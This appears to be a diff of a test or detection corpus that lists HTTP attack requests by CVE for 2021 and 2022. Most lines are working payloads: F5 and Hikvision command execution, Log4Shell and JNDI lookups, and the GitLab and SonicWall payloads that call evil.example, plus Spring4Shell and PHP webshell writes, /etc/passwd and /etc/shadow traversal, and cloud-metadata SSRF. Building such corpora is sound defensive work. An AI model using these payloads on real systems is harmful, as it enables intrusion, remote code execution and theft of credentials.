+# --- CVE-2021-22986 (F5 BIG-IP iControl REST, KEV): the login endpoint mints a
+#     token for an unauthenticated caller and /mgmt/tm/util/bash runs commands. ---
+POST /mgmt/shared/authn/login header="Content-Type: application/json" body="{\"username\":\"admin\",\"userReference\":{},\"loginReference\":{\"link\":\"http://localhost/mgmt/shared/gossip\"}}"
+POST /mgmt/tm/util/bash header="X-F5-Auth-Token: 12345678901234567890123456" header="Content-Type: application/json" body="{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
+POST /mgmt/tm/util/bash header="X-F5-Auth-Token: 12345678901234567890123456" header="Content-Type: application/json" body="{\"command\":\"run\",\"utilCmdArgs\":\"-c cat /etc/passwd\"}"
+
+# --- CVE-2021-21972 (VMware vCenter vSphere Client, KEV): the uploadova
+#     endpoint accepts an unauthenticated tar upload whose entry names
+#     traverse to the webroot. ---
+GET /ui/vropspluginui/rest/services/uploadova
+GET /ui/vropspluginui/rest/services/getstatus
+POST /ui/vropspluginui/rest/services/uploadova header="Content-Type: multipart/form-data; boundary=B" body="--B Content-Disposition: form-data; name=\"uploadFile\"; filename=\"Linux.tar\"; Content-Type: application/x-tar --B--"
+POST /ui/vropspluginui/rest/services/uploadova header="Content-Type: multipart/form-data; boundary=B" body="../../usr/lib/vmware-vsphere-ui/server/static/resources/libs/shell.jsp"
+
+# --- CVE-2021-21985 (VMware vCenter vSphere Client h5-vsan proxy, KEV): the
+#     proxy service can be driven through staged calls that end in a static
+#     method invocation such as a JNDI lookup. ---
+POST /ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData header="Content-Type: application/json" body="{\"methodInput\":[{\"type\":\"ClusterComputeResource\",\"value\":null,\"serverGuid\":null}]}"
+POST /ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setTargetObject header="Content-Type: application/json" body="{\"methodInput\":[null]}"
+POST /ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setStaticMethod header="Content-Type: application/json" body="{\"methodInput\":[\"javax.naming.InitialContext.doLookup\"]}"
+POST /ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setArguments header="Content-Type: application/json" body="{\"methodInput\":[[\"ldap://evil.example/x\"]]}"
+POST /ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/invoke header="Content-Type: application/json" body="{\"methodInput\":[]}"
+
+# --- CVE-2021-22005 (VMware vCenter Analytics service, KEV): the telemetry
+#     collector endpoint accepts unauthenticated file writes. ---
+POST /analytics/telemetry/ph/api/hyper/send?_c&_i=test header="Content-Type: application/json" body="x"
+POST /analytics/telemetry/ph/api/hyper/send?_c=vmware&_i=vmware header="Content-Type: application/json" body="{}"
+
+# --- CVE-2021-43798 (Grafana plugin static route, KEV): the plugin slug in
+#     /public/plugins/<slug>/ is not sanitized, so dot segments read files. ---
+GET /public/plugins/alertlist/../../../../../../../../etc/passwd
+GET /public/plugins/graphite/../../../../../../../../etc/passwd
+GET /public/plugins/alertlist/../../../../../../../../windows/win.ini
+
+# --- CVE-2021-35464 (ForgeRock Access Management, KEV): '/..;/' path
+#     normalization reaches the Jato /ccversion/Version handler, whose
+#     jato.pageSession is deserialized (rO0ABQ marks a Java serialization
+#     stream). ---
+GET /openam/oauth2/..;/ccversion/Version
+GET /openam/..;/ccversion/Version
+GET /openam/oauth2/..;/ccversion/Version?jato.pageSession=rO0ABQ
+
+# --- CVE-2021-40539 (Zoho ManageEngine ADSelfService Plus, KEV): a '/./'
+#     prefix bypasses REST authentication and a multipart upload writes JSP. ---
+POST /./RestAPI/LogonCustomization header="Content-Type: multipart/form-data; boundary=B" bodyhex=2d2d420d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d226d6574686f64546f43616c6c220d0a0d0a756e7370656369666965640d0a2d2d420d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2253617665220d0a0d0a7965730d0a2d2d420d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2243455254494649434154455f50415448223b2066696c656e616d653d2277732e6a7370220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a3c2540207061676520696d706f72743d226a6176612e73656375726974792e4d6573736167654469676573742220253e3c25206f75742e7072696e746c6e2831293b20253e0d0a2d2d422d2d0d0a
+POST /./RestAPI/LogonCustomization header="Content-Type: multipart/form-data; boundary=B" body="--B Content-Disposition: form-data; name=\"CERTIFICATE_PATH\"; filename=\"../../webapps/ROOT/ws.jsp\" --B--"
+
+# --- CVE-2021-33044 / CVE-2021-33045 (Dahua cameras and VTO, KEV): dangling
+#     or loopback login parameters are accepted and return a valid session. ---
+POST /RPC2_Login header="Content-Type: application/json" body="{\"method\":\"global.login\",\"params\":{\"userName\":\"admin\",\"password\":\"Not Used\",\"clientType\":\"NetKeyboard\",\"loginType\":\"Direct\",\"authorityType\":\"Default\",\"passwordType\":\"Default\"},\"id\":1,\"session\":0}"
+POST /RPC2_Login header="Content-Type: application/json" body="{\"method\":\"global.login\",\"params\":{\"userName\":\"admin\",\"ipAddr\":\"127.0.0.1\",\"loginType\":\"Loopback\",\"clientType\":\"Local\",\"authorityType\":\"Default\",\"passwordType\":\"Plain\",\"password\":\"admin\"},\"id\":1,\"session\":0}"
+
+# --- CVE-2021-36260 (Hikvision web server command injection, KEV): the
+#     webLanguage endpoint interpolates user input into a shell command. ---
+PUT /SDK/webLanguage header="Content-Type: application/x-www-form-urlencoded; charset=UTF-8" body="<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(echo pwned>webLib/x)</language>"
+PUT /SDK/webLanguage header="Content-Type: application/x-www-form-urlencoded; charset=UTF-8" body="<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(id>webLib/x)</language>"
+
+# --- CVE-2021-22205 (GitLab CE/EE ExifTool DjVu RCE, KEV): an unauthenticated
+#     upload to /uploads/user carries a DjVu image whose metadata runs qx{}
+#     under ExifTool. ---
+POST /uploads/user header="X-CSRF-Token: x" header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5" bodyhex=2d2d2d2d2d2d5765624b6974466f726d426f756e64617279494d76336d7852673539546b465358350d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d22746573742e6a7067220d0a436f6e74656e742d547970653a20696d6167652f6a7065670d0a0d0a41542654464f524d0000006f444a5655494e464f0000000a0000000018002c01160142476a7000000000414e546100000049286d657461646174610a0928436f7079726967687420225c0a22202e2071787b6375726c20687474703a2f2f6576696c2e6578616d706c652f787d202e205c0a22206220222920290a0d0a2d2d2d2d2d2d5765624b6974466f726d426f756e64617279494d76336d7852673539546b465358352d2d0d0a
+
+# --- CVE-2021-3129 (Laravel Ignition, KEV): /_ignition/execute-solution runs
+#     MakeViewVariableOptionalSolution with an attacker-chosen viewFile that
+#     can write and then load a phar from the log file. ---
+POST /_ignition/execute-solution header="Content-Type: application/json" body="{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"pwn\",\"viewFile\":\"php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log\"}}"
+POST /_ignition/execute-solution header="Content-Type: application/json" body="{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"pwn\",\"viewFile\":\"AA\"}}"
+POST /_ignition/execute-solution header="Content-Type: application/json" body="{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"pwn\",\"viewFile\":\"phar://../storage/logs/laravel.log/test.txt\"}}"
+
+# --- CVE-2021-29441 (Alibaba Nacos): any request carrying the hard-coded
+#     User-Agent: Nacos-Server skips authentication. ---
+GET /nacos/v1/auth/users?pageNo=1&pageSize=9 ua=Nacos-Server
+POST /nacos/v1/auth/users?username=vulhub&password=vulhub ua=Nacos-Server
+POST /nacos/v1/cs/configs?dataId=x&group=x&content=x ua=Nacos-Server
+# --- CVE-2021-29442 (Alibaba Nacos Derby console): the ops/derby endpoint
+#     executes SQL without authentication. ---
+GET /nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
+GET /nacos/v1/cs/ops/derby?sql=select+*+from+config_info
+
+# --- CVE-2021-37580 (Apache ShenYu admin): a JWT signed with the default
+#     secret is accepted by /dashboardUser. ---
+GET /dashboardUser header="X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwiZXhwIjoxNjM3MjY1MTIxfQ.-jjw2bGyQxna5Soe4fLVLaD3gUT5ALTcsvutPQoE2qk"
+GET /dashboardUser?userName=admin header="X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwiZXhwIjoxNjM3MjY1MTIxfQ.-jjw2bGyQxna5Soe4fLVLaD3gUT5ALTcsvutPQoE2qk"
+
+# --- CVE-2021-25122 (Apache Tomcat h2c request mix-up): a request that
+#     starts with an h2c upgrade and carries a body makes Tomcat duplicate
+#     request data. ---
+POST /api/items header="Upgrade: h2c" header="Connection: Upgrade, HTTP2-Settings" header="HTTP2-Settings: AAMAAABkAAQAAP__" body="x"
+# The prior-knowledge h2c variant sends no Upgrade header, so it is
+# byte-identical to a normal HTTP/2 request and cannot be expressed as a
+# match; the HTTP/2 parser and connection-level limits are the mitigation.
+
+# --- CVE-2021-44228 / CVE-2021-45046 (Apache Log4j2 Log4Shell, KEV): the
+#     publicly documented nested-lookup obfuscation variants of ${jndi:}. ---
+GET / ua=${${lower:j}ndi:ldap://evil.example/x}
+GET / ua=${${upper:j}ndi:ldap://evil.example/x}
+GET / header="X-Api-Version: ${${env:BARFOO:-j}ndi:ldap://evil.example/x}"
+GET / header="X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/x}"
+
+# --- CVE-2021-22941 (Citrix ShareFile storage zones controller, KEV): the
+#     uploadid query parameter traverses into ConfigService and the later
+#     Error page executes the written ASPX. ---
+POST /upload.aspx?uploadid=%40using%20System.Diagnostics%3b%40%7bProcess.Start(Request.QueryString%5b%220%22%5d)%3b%7d/../../ConfigService%5cViews%5cShared%5cError.cshtml&bp=123&accountid=123 header="Content-Type: multipart/form-data; boundary=boundary" bodyhex=2d2d626f756e646172790d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d227465787434223b2066696c656e616d653d227465787435220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a414141410d0a2d2d626f756e646172792d2d0d0a
+GET /configservice/Home/Error?0=CMD.exe&1=/C%20whoami
+GET /configservice/Home/Error?0=CMD.exe&1=/C%20ping%20-n%205%20127.0.0.1
+
+# --- CVE-2021-20090 (Arcadyan/Buffalo router web interface, KEV): the
+#     /images route decodes ..%2f and allows traversal. ---
+GET /images/..%2finfo.html
+GET /images/..%2f..%2f..%2f..%2fetc%2fpasswd
+GET /images/..%2f..%2f..%2f..%2fetc%2fshadow
+
+# --- CVE-2021-20038 (SonicWall SMA 100 SSLVPN mod_cgi, KEV): a stack
+#     overflow in CGI environment parsing; the public PoC uses the
+#     firmware-specific addresses below and a 518-byte pad. ---
+GET /%04%d7%7f%bf%18%d8%7f%bf%18%d8%7f%bf%08%b7%06%08;%7bcurl,http://evil.example/+%2dH+%27User%2dAgent%3a+x%27%7d;%04%d7%7f%bf%18%d8%7f%bf%18%d8%7f%bf%08%b7%06%08;%7bcurl,http://evil.example/+%2dH+%27User%2dAgent%3a+x%27%7d;?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+GET /%04%d7%7f%bf%18%d8%7f%bf%18%d8%7f%bf%64%b8%06%08;%7bcurl,http://evil.example/+%2dH+%27User%2dAgent%3a+x%27%7d;?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+# --- CVE-2021-35587 (Oracle Access Manager OpenSSO agent, KEV): the
+#     sessionservice endpoint is reachable pre-auth; the deserialization RCE
+#     step has no single-request public shape. ---
+GET /oam/server/opensso/sessionservice
+
+# --- CVE-2021-40822 (GeoServer TestWfsPost SSRF): the url parameter is
+#     fetched server-side. ---
+POST /geoserver/TestWfsPost header="Content-Type: application/x-www-form-urlencoded" body="form_hf_0=&url=http://169.254.169.254/latest/meta-data/&body=&username=&password="
+POST /geoserver/TestWfsPost header="Content-Type: application/x-www-form-urlencoded" body="form_hf_0=&url=http://127.0.0.1:8080/geoserver/web/&body=&username=&password="
+
+# --- CVE-2021-31805 (Apache Struts S2-062): a second OGNL evaluation is
+#     reached through the %{} syntax inside a form field value. ---
+POST /index.action header="Content-Type: application/x-www-form-urlencoded" body="id=%{(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))}"
+POST /index.action header="Content-Type: application/x-www-form-urlencoded" body="id=%{(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString()}"
+
+# --- CVE-2021-40346 (HAProxy request smuggling): a header whose name starts
+#     with Content-Length but is longer than the parser allows hides the real
+#     Content-Length, so the bytes below become a second request. ---
+POST / header="Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:" header="Content-Length: 40" bodyhex=474554202f61646d696e20485454502f312e310d0a486f73743a206578616d706c652e636f6d0d0a
+POST / header="Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:" header="Content-Length: 42" bodyhex=474554202f7072697661746520485454502f312e310d0a486f73743a206578616d706c652e636f6d0d0a
+
+# --- CVE-2021-42392 (H2 database console JNDI RCE): the login form accepts
+#     a JNDI driver and URL. ---
+POST /h2-console/login.do?jsessionid=1 header="Content-Type: application/x-www-form-urlencoded" body="driver=javax.naming.InitialContext&url=ldap://evil.example/x&user=&password="
+POST /test.do?jsessionid=1 header="Content-Type: application/x-www-form-urlencoded" body="driver=javax.naming.InitialContext&url=ldap://evil.example/x&user=&password="
+
+# --- CVE-2021-44077 (Zoho ManageEngine ServiceDesk Plus, KEV): an executable
+#     upload via ImportTechnicians plus an s247action trigger. ---
+GET /RestAPI/ImportTechnicians
+POST /RestAPI/ImportTechnicians?step=1 header="Content-Type: multipart/form-data; boundary=B" bodyhex=2d2d420d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2274686546696c65223b2066696c656e616d653d226d7369657865632e657865220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a4d5a0d0a2d2d422d2d0d0a
+POST /./RestAPI/s247action header="Content-Type: application/x-www-form-urlencoded" body="execute=s247AgentInstallationProcess"
+
+# --- CVE-2021-44515 (Zoho Desktop Central agentLogUploader, KEV): a forged
+#     STATE cookie reaches the agent upload handler without authentication. ---
+GET /STATE_ID/123/agentLogUploader header="Cookie: STATE_COOKIE=&_REQS/_TIME/123"
+
+# --- CVE-2021-45232 (Apache APISIX Dashboard): migrate/export and
+#     migrate/import bypass authentication; the import can carry Lua scripts. ---
+GET /apisix/admin/migrate/export
+POST /apisix/admin/migrate/import header="Content-Type: application/octet-stream" body="return function() os.execute('id') end"
+
+# --- CVE-2021-25646 (Apache Druid sampler JavaScript execution): the parser
+#     format accepts a JavaScript function that may call Java. ---
+POST /druid/indexer/v1/sampler header="Content-Type: application/json" body="{\"type\":\"index\",\"spec\":{\"ioConfig\":{\"type\":\"index\",\"firehose\":{\"type\":\"local\",\"baseDir\":\"/etc\",\"filter\":\"passwd\"}},\"dataSchema\":{\"dataSource\":\"x\",\"parser\":{\"parseSpec\":{\"format\":\"javascript\",\"timestampSpec\":{},\"dimensionsSpec\":{},\"function\":\"function(){return java.lang.Runtime.getRuntime().exec('id')}\"}}}},\"samplerConfig\":{\"numRows\":10}}"
+
+# --- CVE-2021-27850 (Apache Tapestry): /assets serves AppModule.class, the
+#     file that carries the HMAC secret used to sign serialized data. ---
+GET /assets/app/something/services/AppModule.class/
+GET /assets/app/services/AppModule.class
+
+# --- CVE-2021-26295 / CVE-2021-30128 (Apache OFBiz SOAP deserialization):
+#     clearAllEntityCaches deserializes the cus-obj argument (rO0ABQ marks a
+#     Java serialization stream; the full exploit embeds a gadget). ---
+POST /webtools/control/SOAPService header="Content-Type: text/xml" body="<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/'><soapenv:Body><ns1:clearAllEntityCaches xmlns:ns1='http://ofbiz.apache.org/service/'><ns1:cus-obj>rO0ABQ</ns1:cus-obj></ns1:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>"
+POST /webtools/control/SOAPService header="Content-Type: text/xml" body="<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/'><soapenv:Body><ser><map-Map><map-Entry><map-Key><cus-obj>rO0ABQ</cus-obj></map-Key><map-Value><std-String/></map-Value></map-Entry></map-Map></ser></soapenv:Body></soapenv:Envelope>"
+
+# --- CVE-2021-38647 (Microsoft OMI/SCX WSMan, KEV): an unauthenticated
+#     ExecuteScript operation over WS-Management. ---
+POST /wsman header="Content-Type: application/soap+xml;charset=UTF-8" body="<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:a='http://schemas.xmlsoap.org/ws/2004/08/addressing' xmlns:w='http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd' xmlns:p='http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd'><s:Header><a:To>HTTP://127.0.0.1/wsman/</a:To><w:ResourceURI s:mustUnderstand='true'>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI><a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action><w:SelectorSet><w:Selector Name='__cimnamespace'>root/scx</w:Selector></w:SelectorSet></s:Header><s:Body><p:ExecuteScript_INPUT><p:Script>aWQ=</p:Script><p:Arguments></p:Arguments><p:timeout>0</p:timeout><p:b64encoded>true</p:b64encoded></p:ExecuteScript_INPUT></s:Body></s:Envelope>"
+
+# --- CVE-2021-42237 (Sitecore XP Report.ashx, KEV): typed XML
+#     deserialization through a Comparison delegate (body trimmed to the
+#     family's markers; the public gadget is longer). ---
+POST /sitecore/shell/ClientBin/Reporting/Report.ashx header="Content-Type: text/xml" body="<?xml version='1.0' ?><a><query></query><source>foo</source><parameters><parameter name=''><ArrayOfstring z:Type='System.Collections.Generic.SortedSet`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]' z:FactoryType='a:DelegateSerializationHolder' xmlns='http://schemas.microsoft.com/2003/10/Serialization/Arrays' xmlns:a='http://schemas.datacontract.org/2004/07/System' xmlns:z='http://schemas.microsoft.com/2003/10/Serialization/'><Delegate z:Type='System.DelegateSerializationHolder+DelegateEntry'><a:methodName>Start</a:methodName><a:targetTypeName>System.Diagnostics.Process</a:targetTypeName></Delegate></ArrayOfstring></parameter></parameters></a>"
+
+# --- CVE-2021-27101 / CVE-2021-27102 (Accellion FTA, KEV): a public PoC
+#     injects SQL through the Host header of /courier/oauth.api and then
+#     abuses the admin command path for a file write. ---
+POST /courier/oauth.api?sid=935ee00&rid=9700968/initial header="Host: x.'))union(select(1))#"
+POST /courier/oauth.api?sid=935ee00&rid=9708980/initial header="Host: 127.0.0.1" header="Content-Type: application/x-www-form-urlencoded" body="cmd=V,DF,$(id);FUK;&secret=x"
+
+# --- CVE-2021-32648 (October CMS, KEV): the password restore/reset flow
+#     lets an unauthenticated caller change an account password. ---
+GET /backend/backend/auth/restore
+POST /backend/backend/auth/restore header="Content-Type: application/x-www-form-urlencoded" body="_token=x&postback=1&login=admin"
+POST /backend/backend/auth/reset/1/x header="Content-Type: application/json" body="{\"_token\":\"x\",\"postback\":1,\"id\":1,\"code\":true,\"password\":\"P@ssw0rd123!\"}"
+
+# --- CVE-2021-41277 (Metabase GeoJSON API LFI, KEV): the url parameter
+#     accepts file:// URLs. ---
+GET /api/geojson?url=file:////etc/passwd
+GET /api/geojson?url=file:///etc/passwd
+
+# --- CVE-2021-21402 (Jellyfin path traversal on Windows): the HLS audio
+#     route decodes ..%5C in the media id. ---
+GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/
+GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts/stream.mp3/
+
+# --- CVE-2021-40870 (Aviatrix Controller, KEV): the backend API writes a
+#     PHP file through traversal in account_name. ---
+POST /v1/backend1 header="Content-Type: application/x-www-form-urlencoded" body="CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/RCE.php&data=<?php system($_REQUEST['cmd']); ?>"
+GET /v1/RCE.php
+
+# --- CVE-2021-3019 (ffay lanproxy): directory traversal reads the
+#     connection configuration that carries credentials. ---
+GET /../conf/config.properties
+GET /%2e%2e/conf/config.properties
+
+# --- 2021 attack classes left out ---
+# CVE-2021-26085 / CVE-2021-26086 (Confluence/Jira file read): KEV-listed but
+#   CVSS 5.3, below the 7.0 selection threshold.
+# CVE-2021-34429 (Jetty ambiguous URI): CVSS 5.3.
+# CVE-2021-22214 (GitLab CI lint SSRF): CVSS 6.8, below the threshold.
+# CVE-2021-33037 (Tomcat Transfer-Encoding parsing): CVSS 5.3; the generic
+#   chunked-smuggling probes already cover the header shape.
+# CVE-2021-36749 (Druid file read): CVSS 6.5; the sampler family is covered
+#   by CVE-2021-25646.
+# CVE-2021-45105 (Log4j2 DoS, 5.9) and CVE-2021-44832 (6.6, JDBC appender
+#   configuration): below the threshold or configuration-specific.
+# CVE-2021-22893 (Pulse Connect Secure, KEV, 10.0): the exploited iHub
+#   deserialization has no public request shape; CVE-2021-22894 is an
+#   authenticated buffer overflow.
+# CVE-2021-22900 (Pulse Connect Secure): authenticated administrator upload.
+# CVE-2021-27764: missing HttpOnly/Secure cookie flags, no attack request.
+# CVE-2021-30116 (Kaseya VSA, KEV): the REvil attack chain has no public
+#   request shape.
+# CVE-2021-31166 (Windows HTTP.sys): heap-layout exploit; no stable request.
+# CVE-2021-35211 (SolarWinds Serv-U, KEV): SSH vector, not HTTP.
+# CVE-2021-26919 (Apache Druid JDBC): needs an attacker-run MySQL server;
+#   no static request line.
+# CVE-2021-27103 (Accellion FTA SSRF): no public request line.
+# CVE-2021-25329 (Tomcat session persistence), CVE-2021-24122 (NTFS network
+#   shares) and CVE-2021-41079 (TLS packet handling): configuration-specific
+#   or connection-level, no request line.
+# CVE-2021-33193 (httpd mod_h2 request splitting), CVE-2021-36160
+#   (mod_proxy_uwsgi overread), CVE-2021-31618 / CVE-2021-41524 /
+#   CVE-2021-26690 / CVE-2021-26691 (httpd DoS): raw h2 method bytes,
+#   uwsgi mappings, or crash-only shapes.
+# CVE-2021-4102 and the other 2021 Chrome/WebKit bugs are client-side.
+# CVE-2021-31207 is CVSS 6.6 but is included inside the ProxyShell family
+#   because the KEV chain relies on it together with CVE-2021-34473/34523.
+
+# ---------------------------------------------------------------------------
+# 2022 CVEs: attacks against HTTP servers and web frameworks.
+#
+# Grouped by advisory family. Requests that cannot be expressed as a single
+# request line (binary bodies, connection-level framing) are summarized at the end.
+# ---------------------------------------------------------------------------
+
+# --- CVE-2022-1388 (F5 BIG-IP iControl REST: unauthenticated bash endpoint) ---
+POST /mgmt/tm/util/bash header="Connection: keep-alive, X-F5-Auth-Token" header="X-F5-Auth-Token: a" header="Authorization: Basic YWRtaW46YWRtaW4=" header="Content-Type: application/json" body="{\"command\": \"run\", \"utilCmdArgs\": \"-c 'id'\"}"
+POST /mgmt/tm/util/bash header="Connection: keep-alive, X-F5-Auth-Token" header="X-F5-Auth-Token: a" header="Authorization: Basic YWRtaW46YWRtaW4=" header="Content-Type: application/json" body="{\"command\": \"run\", \"utilCmdArgs\": \"-c 'cat /etc/passwd'\"}"
+
+# --- CVE-2022-21587 (Oracle E-Business Suite: BneOfflineLOVService upload) ---
+POST /OA_HTML/BneOfflineLOVService?bne:uueupload=true header="Content-Type: multipart/form-data; boundary=x" body="Content-Disposition: form-data; name=\"uploadfilename\";filename=\"../../OA_HTML/pwn.jsp\""
+GET /forms/taint.jsp
+
+# --- CVE-2022-22947 (Spring Cloud Gateway: Actuator route SpEL) ---
+POST /actuator/gateway/routes/evil header="Content-Type: application/json" body="{\"predicates\":[{\"name\":\"Path\",\"args\":{\"_genkey_0\":\"/evil/**\"}}],\"filters\":[{\"name\":\"RewritePath\",\"args\":{\"_genkey_0\":\"#{T(java.lang.Runtime).getRuntime().exec('id')}\",\"_genkey_1\":\"/${path}\"}}],\"uri\":\"http://example.com\",\"order\":0}"
+POST /actuator/gateway/refresh header="Content-Type: application/json"
+DELETE /actuator/gateway/routes/evil
+GET /actuator/gateway/routes/evil
+
+# --- CVE-2022-22954 / CVE-2022-22955 / CVE-2022-22956 (VMware Workspace ONE Access: FreeMarker SSTI and OAuth2 ACS abuse) ---
+GET /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D
+GET /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22cat%20%2Fetc%2Fpasswd%22%29%7D
+POST /SAAS/API/1.0/REST/oauth2/generateActivationToken/Service__OAuth2Client header="Content-Type: application/x-www-form-urlencoded"
+POST /SAAS/API/1.0/REST/oauth2/activate header="Content-Type: application/x-www-form-urlencoded" body="activation_token=SERVICE_ACTIVATION_TOKEN"
+POST /SAAS/auth/oauthtoken header="Content-Type: application/x-www-form-urlencoded" body="grant_type=client_credentials&client_id=admin&client_secret=x"
+
+# --- CVE-2022-22963 (Spring Cloud Function: routing-expression header SpEL) ---
+POST /functionRouter header="spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')" header="Content-Type: text/plain" body="data"
+POST /functionRouter header="spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{'id'})" header="Content-Type: text/plain" body="x"
+
+# --- CVE-2022-22965 (Spring Framework: classLoader data binding RCE) ---
+GET /?class.module.classLoader.resources.context.configFile=http://evil.example/x&class.module.classLoader.resources.context.configFile.content.aaa=xxx
+POST / body="class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20java.lang.Runtime.getRuntime().exec(request.getParameter(%22cmd%22))%3B%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+POST / body="class.module.classLoader.DefaultAssertionStatus=true"
+
+# --- CVE-2022-22972 (VMware Workspace ONE Access: Host-header auth bypass) ---
+GET /vcac/?original_uri=/vcac
+POST /SAAS/auth/login/embeddedauthbroker/callback header="Content-Type: application/x-www-form-urlencoded" header="Host: evil.example" body="protected_state=1&userstore=vsphere.local&username=administrator&password=horizon&userstoreDisplay=1&horizonRelayState=1&stickyConnectorId=1&action=Sign+in"
+
+# --- CVE-2022-22978 (Spring Security: newline bypass in RegexRequestMatcher) ---
+GET /admin/%0d
+GET /admin/%0a
